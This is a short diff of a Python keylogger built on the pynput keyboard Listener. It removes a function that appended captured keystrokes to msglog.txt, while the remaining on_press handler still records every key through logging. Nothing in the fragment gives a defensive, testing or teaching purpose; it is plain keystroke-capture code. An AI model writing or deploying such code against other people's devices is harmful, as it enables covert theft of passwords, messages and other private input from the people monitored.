@@ -76,23 +76,7 @@ def on_press(key):
             tab += str(key).replace("'", "")
         case _:
             logging.info(str(key))
-    
-def msg_global():
-    x=r'msglog.txt'
-    if os.path.exists(x):
-        if os.path.isfile(x):
-            print("file already exists")
-            f = open(x, "a")
-    else:
-        print("file is not existed and creating a new file")
-        f = open(x,"w")
-
-    f.write(tab)
-    f.close()
-    return
-
 
 # listener sur l'action d'appuyer une touche
 with Listener(on_press=on_press) as listener:
     listener.join()
-    msg_global()
